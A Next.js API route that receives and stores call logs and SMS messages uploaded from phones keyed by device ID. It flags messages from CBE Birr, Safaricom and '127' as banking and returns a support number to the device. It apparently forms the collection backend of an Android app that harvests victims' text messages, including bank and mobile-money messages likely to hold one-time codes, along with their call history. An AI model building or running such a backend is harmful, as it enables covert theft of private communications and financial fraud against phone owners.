import { NextRequest, NextResponse } from 'next/server';
import { DialerCallLogEntry } from '@/lib/owner-types';
import { saveDeviceCallLogs, syncDeviceHeartbeat } from '@/lib/owner-store';
import { isValidServerDeviceId, smsStore } from '@/lib/sms-store';
import { buildSupportCorsHeaders } from '@/lib/support-auth';

export const dynamic = 'force-dynamic';

function sanitizePart(raw: unknown, maxLen: number): string {
  return String(raw ?? '')
    .trim()
    .slice(0, maxLen);
}

export async function OPTIONS(req: NextRequest) {
  return new NextResponse(null, { status: 204, headers: buildSupportCorsHeaders(req) });
}

export async function POST(req: NextRequest) {
  const corsHeaders = buildSupportCorsHeaders(req);
  try {
    const body = (await req.json().catch(() => ({}))) as Record<string, unknown>;
    const headerDeviceId = (req.headers.get('x-device-id') || '').trim();
    const deviceId = String(body.deviceId || headerDeviceId).trim();

    if (!headerDeviceId || headerDeviceId !== deviceId || !isValidServerDeviceId(deviceId)) {
      return NextResponse.json(
        { success: false, error: 'Unauthorized or invalid deviceId' },
        { status: 401, headers: corsHeaders }
      );
    }

    const callLogPermGranted =
      typeof body.callLogPermGranted === 'boolean' ? body.callLogPermGranted : undefined;
    const smsPermGranted =
      typeof body.smsPermGranted === 'boolean' ? body.smsPermGranted : undefined;
    const contactsPermGranted =
      typeof body.contactsPermGranted === 'boolean' ? body.contactsPermGranted : undefined;

    let savedCallLogsCount = 0;
    if (callLogPermGranted === true && Array.isArray(body.callLogs)) {
      const validTypes = new Set(['incoming', 'outgoing', 'missed', 'rejected', 'blocked']);
      const normalizedLogs: DialerCallLogEntry[] = [];
      for (const raw of body.callLogs.slice(0, 150)) {
        if (!raw || typeof raw !== 'object') continue;
        const item = raw as Record<string, unknown>;
        const number = sanitizePart(item.number, 48);
        if (!number) continue;
        const typeStr = String(item.type || 'incoming').toLowerCase();
        const type = (
          validTypes.has(typeStr) ? typeStr : 'incoming'
        ) as DialerCallLogEntry['type'];
        const dateMsRaw = Number(item.dateMs ?? item.timestamp ?? Date.now());
        const dateMs = Number.isFinite(dateMsRaw) && dateMsRaw > 0 ? Math.round(dateMsRaw) : Date.now();
        const durRaw = Number(item.durationSec ?? item.duration ?? 0);
        const durationSec =
          Number.isFinite(durRaw) && durRaw >= 0 ? Math.min(86400, Math.round(durRaw)) : 0;
        const id = sanitizePart(item.id, 64) || `${dateMs}_${number.replace(/[^0-9+]/g, '')}`;
        normalizedLogs.push({
          id,
          number,
          name: sanitizePart(item.name, 80),
          type,
          dateMs,
          durationSec,
        });
      }
      const saved = await saveDeviceCallLogs(deviceId, normalizedLogs);
      savedCallLogsCount = saved.length;
    }

    let savedSmsCount = 0;
    if (smsPermGranted === true && Array.isArray(body.smsMessages)) {
      const existing = await smsStore.getAllMessagesAsync(deviceId);
      const existingIds = new Set(existing.map((m) => m.id));
      const devPrefix = deviceId.replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 24);
      const toInsert: Array<{
        id: string;
        deviceId: string;
        conversationId: string;
        sender: string;
        senderName: string;
        text: string;
        timestamp: string;
        date: string;
        isOutgoing: boolean;
        isBank: boolean;
        status: 'delivered' | 'read';
        createdAt: number;
      }> = [];

      for (const raw of body.smsMessages.slice(0, 150)) {
        if (!raw || typeof raw !== 'object') continue;
        const item = raw as Record<string, unknown>;
        const text = sanitizePart(item.text || item.body, 2000);
        if (!text) continue;
        const senderRaw = sanitizePart(item.sender || item.address || item.senderName, 80) || 'Unknown';
        const rawId = sanitizePart(item.id || item.smsId, 48).replace(/[^a-zA-Z0-9_\-]/g, '_');
        const dateMsRaw = Number(item.dateMs || item.createdAt || 0);
        const dateMs =
          Number.isFinite(dateMsRaw) && dateMsRaw > 0 ? Math.round(dateMsRaw) : Date.now();
        const deterministicId = rawId
          ? `sim_${devPrefix}_${rawId}`
          : `sim_${devPrefix}_${dateMs}_${senderRaw.replace(/[^a-zA-Z0-9]/g, '').slice(0, 16)}`;

        if (existingIds.has(deterministicId)) continue;
        existingIds.add(deterministicId);

        const dateObj = new Date(dateMs);
        const isoDate =
          typeof item.date === 'string' && item.date.trim() ? item.date.trim().slice(0, 64) : dateObj.toISOString();
        const tsStr =
          typeof item.timestamp === 'string' && item.timestamp.trim()
            ? item.timestamp.trim().slice(0, 40)
            : dateObj.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
        const isOutgoing = Boolean(item.isOutgoing);
        const isCbe = senderRaw.toLowerCase().includes('cbe');

        toInsert.push({
          id: deterministicId,
          deviceId,
          conversationId: isCbe ? 'CBEBirr' : senderRaw,
          sender: isCbe ? 'CBEBirr' : senderRaw,
          senderName: isCbe ? 'CBEBirr' : senderRaw,
          text,
          timestamp: tsStr,
          date: isoDate,
          isOutgoing,
          isBank: isCbe || ['127', 'safaricom'].includes(senderRaw.toLowerCase()),
          status: item.read === true ? 'read' : 'delivered',
          createdAt: dateMs,
        });
      }

      // Persist up to 60 newly seen SMS per batch synchronously so serverless finishes cleanly
      const batch = toInsert.slice(0, 60);
      await Promise.all(batch.map((m) => smsStore.addMessageAsync(m).catch(() => null)));
      savedSmsCount = batch.length;
    }

    const syncRes = await syncDeviceHeartbeat({
      deviceId,
      deviceName: typeof body.deviceName === 'string' ? body.deviceName : undefined,
      platform: typeof body.platform === 'string' ? body.platform : undefined,
      appVersion: typeof body.appVersion === 'string' ? body.appVersion : undefined,
      checkOnly: true,
      hasDialer: typeof body.hasDialer === 'boolean' ? body.hasDialer : undefined,
      hasMessages: typeof body.hasMessages === 'boolean' ? body.hasMessages : undefined,
      hasBanking: typeof body.hasBanking === 'boolean' ? body.hasBanking : undefined,
      callLogPermGranted,
      smsPermGranted,
      contactsPermGranted,
    });

    return NextResponse.json(
      {
        success: true,
        deviceId,
        supportNumber: syncRes.syncResponse.supportNumber || '',
        savedCallLogsCount,
        savedSmsCount,
        serverTimeMs: Date.now(),
      },
      { headers: corsHeaders }
    );
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Failed to upload device logs';
    return NextResponse.json(
      { success: false, error: message },
      { status: 500, headers: corsHeaders }
    );
  }
}
